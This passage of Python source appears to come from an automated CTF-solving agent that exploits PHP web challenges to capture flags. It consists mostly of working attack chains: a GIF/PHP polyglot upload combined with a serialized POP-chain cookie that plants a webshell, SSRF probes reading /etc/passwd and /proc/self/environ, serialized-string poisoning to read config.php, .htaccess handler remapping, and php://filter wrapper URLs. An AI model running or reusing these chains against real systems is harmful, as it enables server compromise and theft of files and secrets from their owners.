        register_body = str((register_resp or {}).get("body") or "")
        await self._scan_and_store(register_body, target, evidence_source="http-response")

        login_resp = await self._runtime_proxy_action(
            "request",
            method="POST",
            url=login_url,
            data={email_field: email, password_field: password},
            timeout=20,
            audit_target=login_url,
            audit_metadata={"phase": "php_upload_cookie_pop", "stage": "login"},
        )
        login_body = str((login_resp or {}).get("body") or "")
        await self._scan_and_store(login_body, target, evidence_source="http-response")

        upload_filename = f"flaghunter_polyglot_{seed}.gif"
        php_reader = "<?php echo file_get_contents('/flag'); echo file_get_contents('/flag.txt'); ?>"
        upload_resp = await self._runtime_proxy_action(
            "request",
            method="POST",
            url=upload_url,
            files={
                upload_field: {
                    "filename": upload_filename,
                    "content": "GIF89a" + php_reader,
                    "content_type": "image/gif",
                }
            },
            timeout=20,
            audit_target=upload_url,
            audit_metadata={"phase": "php_upload_cookie_pop", "stage": "upload_polyglot"},
        )
        upload_body = str((upload_resp or {}).get("body") or "")
        await self._scan_and_store(upload_body, target, evidence_source="http-response")

        home_resp = await self._runtime_proxy_action(
            "get",
            url=home_url,
            timeout=20,
            audit_target=home_url,
            audit_metadata={"phase": "php_upload_cookie_pop", "stage": "discover_uploaded_image"},
        )
        home_body = str((home_resp or {}).get("body") or "")
        await self._scan_and_store(home_body, target, evidence_source="http-response")

        match = re.search(r"""(?is)<img[^>]+src=["']([^"']*upload/[^"']+)["']""", home_body)
        if not match:
            match = re.search(r"""(?i)(?:\.\./|\.?/)?upload/[A-Za-z0-9_.\-/]+\.png""", f"{upload_body}\n{home_body}")
        if not match:
            return _ChainOutcome(progress=True, reason="php upload cookie POP: uploaded image path not discovered")

        raw_img_path = match.group(1) if match.lastindex else match.group(0)
        normalized_img_path = "./" + str(raw_img_path).replace("../", "").lstrip("/")
        upload_dir = normalized_img_path.rsplit("/", 1)[0]
        shell_path = f"{upload_dir}/{shell_name}"

        def php_s(value: str) -> str:
            return f's:{len(value)}:"{value}";'

        def php_prop(name: str, value: str) -> str:
            return php_s(name) + value

        profile_payload = (
            'O:26:"app\\web\\controller\\Profile":5:{'
            + php_prop("filename_tmp", php_s(normalized_img_path))
            + php_prop("filename", php_s(shell_path))
            + php_prop("ext", "b:1;")
            + php_prop("except", "a:1:{" + php_s("index") + php_s("upload_img") + "}")
            + php_prop("checker", "i:0;")
            + "}"
        )
        pop_payload = (
            'O:27:"app\\web\\controller\\Register":2:{'
            + php_prop("checker", profile_payload)
            + php_prop("registed", "b:0;")
            + "}"
        )
        cookie_value = base64.b64encode(pop_payload.encode("utf-8")).decode("ascii")
        trigger_resp = await self._runtime_proxy_action(
            "request",
            method="GET",
            url=home_url,
            headers={"Cookie": f"user={cookie_value}"},
            timeout=20,
            audit_target=home_url,
            audit_metadata={"phase": "php_upload_cookie_pop", "stage": "trigger_pop"},
        )
        trigger_body = str((trigger_resp or {}).get("body") or "")
        await self._scan_and_store(trigger_body, target, evidence_source="http-response")

        shell_url = urljoin(base + "/", shell_path.replace("./", "").lstrip("/"))
        shell_resp = await self._runtime_proxy_action(
            "get",
            url=shell_url,
            timeout=20,
            audit_target=shell_url,
            audit_metadata={"phase": "php_upload_cookie_pop", "stage": "fetch_shell"},
        )
        shell_body = str((shell_resp or {}).get("body") or "")
        await self._scan_and_store(shell_body, shell_url, evidence_source="http-response")
        if flag := self._extract_runtime_flag(shell_body):
            verification = await self._observe_flag(
                flag,
                shell_url,
                evidence_source="http-response",
                rationale=f"php upload cookie POP runtime exploit via {artifact_url}",
            )
            if verification.decision in {"verified", "runtime"}:
                await self._store_note(
                    key="ctf_php_upload_cookie_pop",
                    value=f"runtime exploit succeeded via {artifact_url}; shell={shell_url}",
                    category="vulnerability",
                    target=urlparse(target).netloc or target,
                    url=shell_url,
                    weaknesses=[
                        {
                            "id": "php-upload-cookie-pop",
                            "description": "Source leak exposed a cookie unserialize POP chain that copied an uploaded image polyglot to an executable PHP path.",
                        }
                    ],
                )
                return _ChainOutcome(
                    progress=True,
                    flag=verification.flag,
                    reason=f"php upload cookie POP runtime exploit via {artifact_url}",
                )
        return _ChainOutcome(progress=True, reason="php upload cookie POP exhausted without runtime flag")

    async def _attempt_source_fetch_write_ssrf_chain(
        self,
        target: str,
        exploit_info: dict[str, Any],
        *,
        artifact_url: str = "",
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        url_param = str(exploit_info.get("url_param") or "url").strip() or "url"
        filename_param = str(exploit_info.get("filename_param") or "filename").strip() or "filename"
        probe_filename = str(exploit_info.get("probe_filename") or "p/flaghunter_probe.txt").strip() or "p/flaghunter_probe.txt"
        client_ip_header = str(exploit_info.get("client_ip_header") or "").strip()
        client_ip_value = str(exploit_info.get("client_ip_value") or "8.8.8.8").strip() or "8.8.8.8"
        sandbox_prefix = str(exploit_info.get("sandbox_prefix") or "sandbox/").strip() or "sandbox/"
        remote_addr_hash = str(exploit_info.get("remote_addr_hash") or "").strip().lower()
        remote_addr_salt = str(exploit_info.get("remote_addr_salt") or "").strip()

        headers: dict[str, str] = {}
        if client_ip_header:
            headers[client_ip_header] = client_ip_value

        output_urls: list[str] = []
        if client_ip_header and remote_addr_hash in {"md5", "sha1"}:
            digest_input = (remote_addr_salt + client_ip_value).encode("utf-8")
            digest = hashlib.md5(digest_input).hexdigest() if remote_addr_hash == "md5" else hashlib.sha1(digest_input).hexdigest()
            output_parts = [sandbox_prefix.strip("/"), digest]
            normalized_probe = probe_filename.replace("\\", "/").strip("/")
            if "/" in normalized_probe:
                parent, leaf = normalized_probe.rsplit("/", 1)
                if parent and parent != ".":
                    output_parts.append(parent.strip("/"))
                output_parts.append(leaf)
            else:
                output_parts.append(normalized_probe)
            output_urls.append(urljoin(base.rstrip("/") + "/", "/".join(part for part in output_parts if part)))

        fetch_targets = [
            "file:///etc/passwd",
            "file:///proc/self/cmdline",
            "file:///proc/self/environ",
            "file:///var/www/html/index.php",
            "file:///flag",
            "file:///flag.txt",
            "file:///var/www/html/flag",
            "file:///var/www/html/flag.txt",
            "http://127.0.0.1/",
            "http://127.0.0.1/index.php",
        ]
        if artifact_url:
            fetch_targets.insert(0, artifact_url)
        for candidate in self._extract_followup_fetch_targets(
            self._recent_local_source_hint_text(limit=12)
        ):
            if candidate not in fetch_targets:
                fetch_targets.append(candidate)

        progress = False
        reasons: list[str] = []
        seen_targets: set[str] = set()
        max_fetch_targets = 24
        target_index = 0
        while target_index < len(fetch_targets) and target_index < max_fetch_targets:
            fetch_target = fetch_targets[target_index]
            target_index += 1
            normalized_fetch_target = str(fetch_target or "").strip()
            if not normalized_fetch_target or normalized_fetch_target in seen_targets:
                continue
            seen_targets.add(normalized_fetch_target)

            trigger_url = urljoin(
                base.rstrip("/") + "/",
                "?" + urlencode({url_param: normalized_fetch_target, filename_param: probe_filename}),
            )
            trigger_resp = await self._runtime_proxy_action(
                "get",
                url=trigger_url,
                headers=headers or None,
                timeout=12,
                audit_target=trigger_url,
                audit_metadata={
                    "phase": "source_fetch_write_ssrf",
                    "stage": "trigger",
                    "artifact_url": artifact_url,
                },
            )
            if not isinstance(trigger_resp, dict) or trigger_resp.get("error"):
                continue

            progress = True
            final_trigger_url = str(trigger_resp.get("final_url") or trigger_url)
            trigger_body = str(trigger_resp.get("body") or "")
            if trigger_body:
                await self._scan_and_store(trigger_body, final_trigger_url, evidence_source="http-response")

            if self.state is not None:
                self.state.add_observation(
                    "source_fetch_write_probe",
                    normalized_fetch_target,
                    source="backup_source_leak",
                    metadata={
                        "artifact_url": artifact_url,
                        "trigger_url": final_trigger_url,
                        "output_urls": list(output_urls),
                        "strategy_kind": "backup_source_leak",
                    },
                )

            for output_url in output_urls:
                fetch_resp = await self._runtime_proxy_action(
                    "get",
                    url=output_url,
                    headers=headers or None,
                    timeout=12,
                    audit_target=output_url,
                    audit_metadata={
                        "phase": "source_fetch_write_ssrf",
                        "stage": "retrieve",
                        "source_target": normalized_fetch_target,
                    },
                )
                if not isinstance(fetch_resp, dict) or fetch_resp.get("error"):
                    continue
                output_body = str(fetch_resp.get("body") or "")
                if not output_body:
                    continue

                progress = True
                final_output_url = str(fetch_resp.get("final_url") or output_url)
                await self._scan_and_store(output_body, final_output_url, evidence_source="source-leak")
                self._register_runtime_source_hint(
                    output_body,
                    normalized_fetch_target,
                    evidence_source="source-leak",
                )

                if flag := self._extract_flag(output_body):
                    verification = await self._observe_flag(
                        flag,
                        final_output_url,
                        evidence_source="source-leak",
                        rationale=f"source fetch/write probe: {normalized_fetch_target}",
                    )
                    if verification.decision in {"verified", "runtime"}:
                        return _ChainOutcome(
                            progress=True,
                            flag=verification.flag,
                            reason=f"source fetch/write flag: {normalized_fetch_target}",
                        )

                lowered_output = output_body.lower()
                if "root:x:" in lowered_output:
                    reasons.append("source fetch/write confirmed local file read via /etc/passwd")
                elif "/usr/bin/get" in lowered_output or "kubernetes_port=" in lowered_output:
                    reasons.append(f"source fetch/write retrieved runtime file: {normalized_fetch_target}")
                elif "<?php" in lowered_output or "highlight_file" in lowered_output:
                    reasons.append(f"source fetch/write retrieved source: {normalized_fetch_target}")
                for candidate in self._extract_followup_fetch_targets(output_body):
                    if candidate not in seen_targets and candidate not in fetch_targets:
                        fetch_targets.append(candidate)

        if progress:
            return _ChainOutcome(
                progress=True,
                reason="; ".join(dict.fromkeys(reasons)) or "source fetch/write probes succeeded without flag",
            )
        return _ChainOutcome(progress=False, reason="source fetch/write SSRF made no successful retrieval")

    async def _attempt_profile_photo_poisoning_chain(
        self,
        target: str,
        exploit_info: dict[str, Any],
        *,
        artifact_url: str,
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        base = _base_target(target)

        register_url = urljoin(base + "/", str(exploit_info.get("register_path") or "register.php").lstrip("/"))
        login_url = urljoin(base + "/", str(exploit_info.get("login_path") or "index.php").lstrip("/"))
        update_url = urljoin(base + "/", str(exploit_info.get("update_path") or "update.php").lstrip("/"))
        profile_url = urljoin(base + "/", str(exploit_info.get("profile_path") or "profile.php").lstrip("/"))

        username_field = str(exploit_info.get("username_field") or "username")
        password_field = str(exploit_info.get("password_field") or "password")
        phone_field = str(exploit_info.get("phone_field") or "phone")
        email_field = str(exploit_info.get("email_field") or "email")
        nickname_field = str(exploit_info.get("nickname_field") or "nickname[]")
        upload_field = str(exploit_info.get("upload_field") or "photo")
        padding_token = str(exploit_info.get("padding_token") or "where")
        padding_repeats = int(exploit_info.get("padding_repeats") or 34)
        payload_suffix = str(
            exploit_info.get("payload_suffix")
            or '";}s:5:"photo";s:10:"config.php";}'
        )
        poison_target = str(exploit_info.get("poison_target") or "config.php")
        valid_phone = str(exploit_info.get("valid_phone") or "13333333333")
        valid_email = str(exploit_info.get("valid_email") or "a@a.a")
        upload_filename = str(exploit_info.get("upload_filename") or "avatar.txt")
        upload_content = str(exploit_info.get("upload_content") or "HELLOPIA")

        username = f"ctf{int(time.time()) % 100000:05d}"
        password = f"pw{int(time.time()) % 100000:05d}"
        payload = padding_token * padding_repeats + payload_suffix

        progress = False
        reasons: list[str] = []

        register_resp = await self.runtime.proxy_action(
            "request",
            method="POST",
            url=register_url,
            data={username_field: username, password_field: password},
            timeout=20,
        )
        register_body = str((register_resp or {}).get("body") or "")
        await self._scan_and_store(register_body, target, evidence_source="http-response")
        progress = progress or bool(register_body)
        reasons.append(f"register:{(register_body or '')[:80]}")

        login_resp = await self.runtime.proxy_action(
            "request",
            method="POST",
            url=login_url,
            data={username_field: username, password_field: password},
            timeout=20,
        )
        login_body = str((login_resp or {}).get("body") or "")
        await self._scan_and_store(login_body, target, evidence_source="http-response")
        progress = progress or bool(login_body)
        reasons.append(f"login:{(login_body or '')[:80]}")

        update_resp = await self.runtime.proxy_action(
            "request",
            method="POST",
            url=update_url,
            data={
                phone_field: valid_phone,
                email_field: valid_email,
                nickname_field: payload,
            },
            files={
                upload_field: {
                    "filename": upload_filename,
                    "content": upload_content,
                    "content_type": "text/plain",
                }
            },
            timeout=20,
        )
        update_body = str((update_resp or {}).get("body") or "")
        await self._scan_and_store(update_body, target, evidence_source="http-response")
        progress = progress or bool(update_body)
        reasons.append(f"update:{(update_body or '')[:80]}")

        profile_resp = await self.runtime.proxy_action(
            "request",
            method="GET",
            url=profile_url,
            timeout=20,
        )
        profile_body = str((profile_resp or {}).get("body") or "")
        await self._scan_and_store(profile_body, target, evidence_source="http-response")
        progress = progress or bool(profile_body)
        reasons.append(f"profile:{(profile_body or '')[:80]}")

        decoded_profile_blob = self._extract_profile_base64_blob(profile_body)
        if decoded_profile_blob:
            await self._store_note(
                key="ctf_profile_photo_poisoning",
                value=(
                    f"profile poisoning candidate via {artifact_url}; "
                    f"username={username}; target={poison_target}"
                ),
                category="vulnerability",
                target=urlparse(target).netloc or target,
                url=profile_url,
                weaknesses=[
                    {
                        "id": "profile-photo-poisoning",
                        "description": (
                            "Filtered serialized profile data was poisoned so that "
                            "profile['photo'] read an attacker-chosen file."
                        ),
                    }
                ],
            )
            await self._scan_and_store(
                decoded_profile_blob,
                target,
                evidence_source="profile-photo-file-read",
            )
            if flag := self._extract_runtime_flag(decoded_profile_blob):
                verification = await self._observe_flag(
                    flag,
                    target,
                    evidence_source="profile-photo-file-read",
                    rationale=f"profile poisoning via {artifact_url}",
                )
                if verification.decision in {"verified", "runtime"}:
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason=f"profile photo poisoning via {artifact_url}",
                    )
            reasons.append(f"decoded:{decoded_profile_blob[:120]}")

        return _ChainOutcome(
            progress=progress,
            reason="; ".join(reasons[:5]) or f"profile photo poisoning attempted via {artifact_url}",
        )

    def _extract_profile_base64_blob(self, html: str) -> str:
        blob = str(html or "")
        match = re.search(
            r"data:image/[^;]+;base64,([A-Za-z0-9+/=\r\n]+)",
            blob,
            re.IGNORECASE,
        )
        if not match:
            return ""
        encoded = re.sub(r"\s+", "", match.group(1))
        try:
            decoded = base64.b64decode(encoded, validate=False)
        except Exception:
            return ""
        for codec in ("utf-8", "latin-1"):
            try:
                return decoded.decode(codec, errors="ignore")
            except Exception:
                continue
        return ""

    async def _submit_form_request(
        self,
        target: str,
        form: dict[str, Any],
        fields: dict[str, str],
    ) -> tuple[dict[str, Any], str]:
        method = str(form.get("method") or "GET").upper()
        action = str(form.get("action") or "").strip()
        if not action:
            action = target
        action_url = urljoin(target if target.endswith("/") else target + "/", action)

        if method == "GET":
            request_url = _with_query(action_url, fields)
            response = await self._runtime_proxy_action(
                "request",
                method="GET",
                url=request_url,
                timeout=20,
                audit_target=request_url,
                audit_metadata={"phase": "submit_form_request", "method": "GET"},
            )
            return response, request_url

        response = await self._runtime_proxy_action(
            "request",
            method="POST",
            url=action_url,
            data=fields,
            timeout=20,
            audit_target=action_url,
            audit_metadata={"phase": "submit_form_request", "method": "POST"},
        )
        return response, action_url

    def _form_action_url(self, target: str, form: dict[str, Any]) -> str:
        action = str(form.get("action") or "").strip() or target
        return urljoin(target, action)

    def _default_upload_form_fields(self, form: dict[str, Any]) -> dict[str, str]:
        fields: dict[str, str] = {}
        for item in form.get("inputs") or []:
            if not isinstance(item, dict):
                continue
            name = str(item.get("name") or "").strip()
            if not name:
                continue
            field_type = str(item.get("type") or "text").strip().lower()
            if field_type in {"file", "submit", "button", "image", "reset"}:
                continue
            value = str(item.get("value") or "")
            lowered = name.lower()
            if not value and any(token in lowered for token in ("name", "title")):
                value = "flaghunter"
            elif not value and any(token in lowered for token in ("desc", "comment", "content")):
                value = "flaghunter upload probe"
            elif not value and any(token in lowered for token in ("id", "type", "category")):
                value = "1"
            fields[name] = value
        return fields

    def _generic_upload_payloads(self) -> list[dict[str, str]]:
        php_reader = "<?php echo file_get_contents('/flag'); echo file_get_contents('/flag.txt'); ?>"
        return [
            {
                "filename": "flaghunter_probe.txt",
                "content": "flaghunter-upload-probe",
                "content_type": "text/plain",
            },
            {
                "filename": "flaghunter.php",
                "content": php_reader,
                "content_type": "application/x-php",
            },
            {
                "filename": "flaghunter.php.jpg",
                "content": "GIF89a\n" + php_reader,
                "content_type": "image/gif",
            },
            {
                "filename": "flaghunter.phtml",
                "content": php_reader,
                "content_type": "application/octet-stream",
            },
            # Apache .htaccess server-config bypass: when uploads are extension/
            # MIME filtered but arbitrary filenames (incl. .htaccess) are still
            # accepted, drop a .htaccess that remaps a benign image extension to
            # the PHP handler, then upload the paired image-named shell. The
            # chain uploads payloads in order and probes each right after, so the
            # .htaccess lands before its paired .jpg is fetched and executed.
            # Placed last → pure fallback after direct .php*/.phtml attempts; a
            # no-op on servers without .htaccess support (nginx/openresty).
            {
                "filename": ".htaccess",
                "content": "AddType application/x-httpd-php .jpg\n",
                "content_type": "text/plain",
            },
            {
                "filename": "flaghunter_ht.jpg",
                "content": "GIF89a\n" + php_reader,
                "content_type": "image/jpeg",
            },
        ]

    def _upload_followup_urls(
        self,
        *,
        base: str,
        response_body: str,
        response_url: str,
        filename: str,
    ) -> list[str]:
        candidates = self._extract_embedded_links(response_body, response_url)
        for match in re.findall(r"(?i)(?:upload|uploads|files?)/[A-Za-z0-9_.\-/]+", str(response_body or "")):
            candidates.append(urljoin(base + "/", match.lstrip("/")))
        for directory in ("uploads", "upload", "files", "static/uploads"):
            candidates.append(urljoin(base + "/", f"{directory}/{filename}"))

        seen: set[str] = set()
        result: list[str] = []
        for candidate in candidates:
            normalized = _normalize_exploration_url(str(candidate or "").strip())
            if not normalized or normalized in seen:
                continue
            seen.add(normalized)
            result.append(normalized)
        return result[:10]

    async def _follow_uploaded_payloads(
        self,
        urls: list[str],
        filename: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        progress = False
        for url in urls:
            resp = await self._runtime_proxy_action(
                "get",
                url=url,
                timeout=12,
                audit_target=url,
                audit_metadata={"phase": "upload_chain", "stage": "follow_upload", "filename": filename},
            )
            if not isinstance(resp, dict) or resp.get("error"):
                continue
            body = str(resp.get("body") or "")
            status = int(resp.get("status_code") or 0)
            if status <= 0:
                continue
            progress = True
            await self._scan_and_store(body, url, evidence_source="http-response", page_features=page_features)
            if flag := self._extract_flag(body):
                verification = await self._observe_flag(
                    flag,
                    url,
                    evidence_source="http-response",
                    rationale=f"uploaded payload follow-up: {filename}",
                )
                if verification.decision in {"verified", "runtime"}:
                    return _ChainOutcome(progress=True, flag=verification.flag, reason=f"uploaded payload follow-up: {url}")
        return _ChainOutcome(progress=progress, reason="uploaded payload follow-up exhausted" if progress else "")

    async def _execute_terminal_commands(
        self,
        target: str,
        commands: list[str],
    ) -> _ChainOutcome:
        self.tool_guard.require(["terminal"])
        progress = False
        for command in commands:
            result = await self._runtime_execute_command(
                command,
                timeout=180,
                audit_target=target,
                audit_metadata={"phase": "terminal_commands"},
            )
            text = "\n".join(
                part for part in [getattr(result, "stdout", ""), getattr(result, "stderr", "")] if part
            )
            if text:
                progress = True
            await self._scan_and_store(text, target, evidence_source="command-output")
            if flag := self._extract_flag(text):
                verification = await self._observe_flag(
                    flag,
                    target,
                    evidence_source="command-output",
                    rationale=f"command hit: {command}",
                )
                if verification.decision == "verified":
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason=f"command hit: {command}",
                    )
        return _ChainOutcome(progress=progress, reason="commands exhausted")

    async def _scan_and_store(
        self,
        text: str,
        target: str,
        *,
        evidence_source: str = "runtime-output",
        page_features: dict[str, Any] | None = None,
    ) -> None:
        if not text:
            return
        if evidence_source == "source-leak":
            self._register_runtime_source_hint(
                text,
                target,
                evidence_source=evidence_source,
            )
        discovered_links = self._extract_embedded_links(text, target)
        target_lower = str(target or "").strip().lower()
        if target and any(token in target_lower for token in ("?file=", "&file=", "?path=", "&path=", "filename=", "/hints.txt", "/welcome.txt", "/flag.txt")):
            discovered_links = [str(target).strip(), *discovered_links]
        if discovered_links:
            self._ingest_discovered_links(
                discovered_links,
                page_features=page_features,
                discovery_source=evidence_source,
            )
        if flag := self._extract_runtime_flag(text):
            await self._observe_flag(
                flag,
                target,
                evidence_source=evidence_source,
                rationale=f"observed during {evidence_source}",
            )
        sid = _extract_sid_from_text(text)
        if sid:
            await self._store_secret_note("sid", sid, target)

    def _extract_embedded_links(self, text: str, base_url: str) -> list[str]:
        raw_links: list[str] = []
        seen: set[str] = set()
        blob = str(text or "")

        def _append(candidate: str) -> None:
            normalized_candidate = candidate.strip()
            if normalized_candidate.startswith("?"):
                absolute = urljoin(_base_target(base_url) + "/", normalized_candidate)
            else:
                absolute = _join_relative_url(str(base_url or ""), normalized_candidate)
            absolute = _normalize_exploration_url(absolute)
            if (
                not absolute
                or absolute in seen
                or self._should_ignore_exploration_candidate(absolute, base_url=base_url)
            ):
                return
            seen.add(absolute)
            raw_links.append(absolute)

        for href in re.findall(r'href=["\']([^"\'<>]+)["\']', blob, re.IGNORECASE):
            href = href.strip()
            if href and not href.startswith(("#", "javascript:", "mailto:")):
                _append(href)
        for action in re.findall(r'action=["\']([^"\'<>]+)["\']', blob, re.IGNORECASE):
            action = action.strip()
            if action and not action.startswith(("#", "javascript:", "mailto:")):
                _append(action)
        for comment in re.findall(r"<!--(.*?)-->", blob, flags=re.IGNORECASE | re.DOTALL):
            for candidate in re.findall(
                r"(?<![\w/.-])([A-Za-z0-9_.-]+\.(?:php|phps|inc|txt|bak))(?![\w.-])",
                comment,
                flags=re.IGNORECASE,
            ):
                _append(candidate)
        for candidate in re.findall(
            r"(?<![\w/.-])((?:source|hint|flag|welcome|index)\.(?:php|phps|inc|txt|bak))(?![\w.-])",
            blob,
            flags=re.IGNORECASE,
        ):
            _append(candidate)
        for query in re.findall(
            r'(\?(?:[A-Za-z0-9_.-]+=[^"\'<>\s&]+)(?:&[A-Za-z0-9_.-]+=[^"\'<>\s&]+)*)',
            blob,
            re.IGNORECASE,
        ):
            lowered = query.lower()
            if any(token in lowered for token in ("file=", "path=", "filename=", "page=", "include=")):
                _append(query)
        return raw_links

    def _ingest_discovered_links(
        self,
        links: list[str],
        *,
        page_features: dict[str, Any] | None,
        discovery_source: str,
    ) -> None:
        if not links:
            return

        raw_links = list(page_features.get("raw_links") or []) if page_features is not None else []
        endpoints = list(page_features.get("endpoints") or []) if page_features is not None else []
        base_url = (
            str((page_features or {}).get("url") or "")
            or str(getattr(self.state, "target", "") or "")
        )

        for link in links:
            absolute = _normalize_exploration_url(str(link or "").strip())
            if not absolute or self._should_ignore_exploration_candidate(absolute, base_url=base_url):
                continue
            parsed = urlparse(absolute)
            lowered = absolute.lower()
            web_subtypes: list[str] = []
            if any(token in lowered for token in ("?file=", "&file=", "?path=", "&path=", "filename=")):
                web_subtypes.append("file_endpoint")
            if "filehash=" in lowered and "filename=" in lowered:
                web_subtypes.append("file_hash_guard")
            if any(token in lowered for token in ("/hints.txt", "/welcome.txt", "/flag.txt")):
                web_subtypes.append("hint_file")

            if page_features is not None and absolute not in raw_links:
                raw_links.append(absolute)
            if page_features is not None and parsed.path and parsed.path not in endpoints:
                endpoints.append(parsed.path)

            if self.state is None:
                continue

            metadata = {
                "url": absolute,
                "discovery_source": discovery_source,
            }
            if web_subtypes:
                metadata["web_subtype"] = web_subtypes
            self.state.add_observation(
                "derived_link",
                absolute,
                source="secondary_content",
                metadata=metadata,
            )
            self.state.add_exploration_item(
                absolute,
                discovery_source="secondary_content",
                hint_strength=self._classify_exploration_hint_strength(absolute, "secondary_content"),
            )

        if page_features is not None:
            page_features["raw_links"] = raw_links
            page_features["endpoints"] = sorted(set(endpoints))

    def _should_ignore_exploration_candidate(
        self,
        candidate: str,
        *,
        base_url: str | None = None,
    ) -> bool:
        text = str(candidate or "").strip()
        if not text:
            return True
        lowered = text.lower()
        if lowered.startswith(("#", "javascript:", "mailto:", "tel:", "data:")):
            return True

        parsed = urlparse(text)
        if parsed.scheme and parsed.scheme not in {"http", "https"}:
            return True

        # Normalise default ports so http://host and http://host:80 (and https/:443)
        # compare equal — otherwise a target given as http://host:80 makes every
        # same-host link (written without :80 in the HTML) look cross-host and get
        # ignored, leaving the exploration agenda empty.
        def _norm_host(netloc: str, scheme: str) -> str:
            netloc = str(netloc or "").lower()
            if scheme == "http" and netloc.endswith(":80"):
                netloc = netloc[:-3]
            elif scheme == "https" and netloc.endswith(":443"):
                netloc = netloc[:-4]
            return netloc

        base_parsed = urlparse(str(base_url or ""))
        base_host = _norm_host(base_parsed.netloc, base_parsed.scheme or "http")
        current_host = _norm_host(parsed.netloc, parsed.scheme or base_parsed.scheme or "http")
        if base_host and current_host and current_host != base_host:
            return True

        path = (parsed.path or text).strip()
        normalized_path = path.lower().rstrip("/")
        if normalized_path in _HTML_TAG_PSEUDO_PATHS:
            return True

        if normalized_path.endswith(_STATIC_RESOURCE_SUFFIXES):
            return True

        leaf = normalized_path.rsplit("/", 1)[-1]
        if (
            text.startswith("/")
            and "." in leaf
            and not leaf.endswith(_SERVER_SIDE_PATH_SUFFIXES)
            and re.fullmatch(r"[a-z0-9-]+\.[a-z]{2,8}", leaf)
        ):
            return True

        return False

    def _classify_exploration_hint_strength(
        self,
        candidate: str,
        discovery_source: str,
    ) -> int:
        text = str(candidate or "").strip()
        lowered = text.lower()
        parsed = urlparse(text)
        path_only = parsed.path or text
        if "filename=" in lowered and "filehash=" in lowered:
            return 1
        if any(token in lowered for token in ("?file=", "&file=", "?path=", "&path=", "php://filter")):
            return 1
        if any(token in lowered for token in ("/hints.txt", "/welcome.txt", "/flag.txt")):
            return 1
        if any(token in lowered for token in ("/file?", "/read?", "/download?")):
            return 2
        if any(token in lowered for token in ("/file", "/flag", "/hint", "/welcome", "/secret")):
            return 2
        if discovery_source == "link_href" and path_only not in {"", "/"}:
            return 2
        return 3

    def _build_file_wrapper_urls(self, candidate_url: str) -> list[str]:
        parsed = urlparse(str(candidate_url or "").strip())
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return []

        wrapper_urls: list[str] = []
        seen: set[str] = set()
        wrapper_param_names = {"file", "path", "filename", "page", "include"}
        candidate_resources = self._collect_candidate_include_resources(params)
        wrapper_prefixes = (
            "php://filter/convert.base64-encode/resource=",
            "php://filter/read=convert.base64-encode/resource=",
        )

        for param_name, values in params.items():
            if param_name.lower() not in wrapper_param_names:
                continue
            for resource in candidate_resources:
                normalized_resource = str(resource or "").strip().lstrip("/")
                if not normalized_resource:
                    continue
                for prefix in wrapper_prefixes:
                    mutated_params = dict(params)
                    mutated_params[param_name] = [prefix + normalized_resource]
                    mutated_url = parsed._replace(query=urlencode(mutated_params, doseq=True)).geturl()
                    if mutated_url not in seen:
                        seen.add(mutated_url)
                        wrapper_urls.append(mutated_url)
        return wrapper_urls

    def _collect_candidate_include_resources(self, params: dict[str, list[str]]) -> list[str]:
        candidates: list[str] = []
        seen: set[str] = set()
        for values in params.values():
            for value in values:
                normalized = str(value or "").strip()
                if not normalized:
                    continue
                if normalized.startswith("php://"):
                    continue
                stripped = normalized.lstrip("/")
                if stripped and stripped not in seen:
                    seen.add(stripped)
                    candidates.append(stripped)

        for candidate in self._collect_candidate_filenames():
            normalized = str(candidate or "").strip().lstrip("/")
            if normalized and normalized not in seen:
                seen.add(normalized)
                candidates.append(normalized)
        return candidates

    def _decode_base64_source_blob(self, text: str) -> str | None:
        blob = str(text or "").replace("\\r\\n", "\n").replace("\\n", "\n")
        candidate_tokens = re.findall(r"[A-Za-z0-9+/=]{24,}", blob)
        if not candidate_tokens:
            compact = re.sub(r"\s+", "", blob)
            if re.fullmatch(r"[A-Za-z0-9+/=]{24,}", compact):
                candidate_tokens = [compact]

        for compact in candidate_tokens:
            if len(compact) % 4 != 0:
                continue
            try:
                decoded = base64.b64decode(compact, validate=True).decode("utf-8", errors="ignore")
            except Exception:
                continue
            if not decoded:
                continue
            lowered = decoded.lower()
            printable_ratio = sum(1 for ch in decoded if ch.isprintable() or ch in "\r\n\t") / max(len(decoded), 1)
            if printable_ratio < 0.8:
                continue
            if any(marker in lowered for marker in ("<?php", "flag{", "include", "require", "$_")):
                return decoded
        return None

    def _apply_submit_profile(self, submit_profile: dict[str, Any] | None) -> None:
        if self.state is None:
            return
        profile = dict(submit_profile or {})
        if not profile:
            return
        if profile.get("endpoint"):
            self.state.submit_endpoint = str(profile.get("endpoint") or "").strip() or None
        if profile.get("success_pattern"):
            self.state.submit_success_pattern = str(profile.get("success_pattern") or "").strip() or None
        if profile.get("failure_pattern"):
            self.state.submit_failure_pattern = str(profile.get("failure_pattern") or "").strip() or None
        if profile.get("platform_type"):
            self.state.submit_platform_type = str(profile.get("platform_type") or "").strip() or None
        if profile.get("challenge_id"):
            self.state.submit_challenge_id = str(profile.get("challenge_id") or "").strip() or None
        if profile.get("base_url"):
            self.state.submit_base_url = str(profile.get("base_url") or "").strip() or None
        if profile.get("api_key"):
            self.state.submit_api_key = str(profile.get("api_key") or "").strip() or None
        if profile.get("auth_token"):
            self.state.submit_auth_token = str(profile.get("auth_token") or "").strip() or None
        if "auto_submit" in profile:
            value = profile.get("auto_submit")
            self.state.submit_auto = (
                bool(value)
                if isinstance(value, bool)
                else str(value or "").strip().lower() in {"1", "true", "yes", "on"}
            )

    async def _record_uniform_failure_surface(
        self,
        value: str,
        *,
        source: str,
        metadata: dict[str, Any] | None = None,
    ) -> None:
        if self.state is None:
            return
        normalized_meta = dict(metadata or {})
        self.state.add_observation(
            "uniform_failure_surface",
            value,
            source=source,
            metadata=normalized_meta,
        )
        if not self._memory_match_ids:
            return
        entry_id = str(self._memory_match_ids[0] or "").strip()
        if not entry_id:
            return
        payload = str(
            normalized_meta.get("payload")
            or normalized_meta.get("signature")
            or normalized_meta.get("request_url")
            or value
            or ""
        ).strip()
        reason = str(normalized_meta.get("reason") or value or "").strip()
        updated = await self.strategy_memory.record_failure(
            entry_id,
            payload=payload,
            reason=reason,
        )
        if updated is not None:
            self.state.meta_reasonings.append(
                {
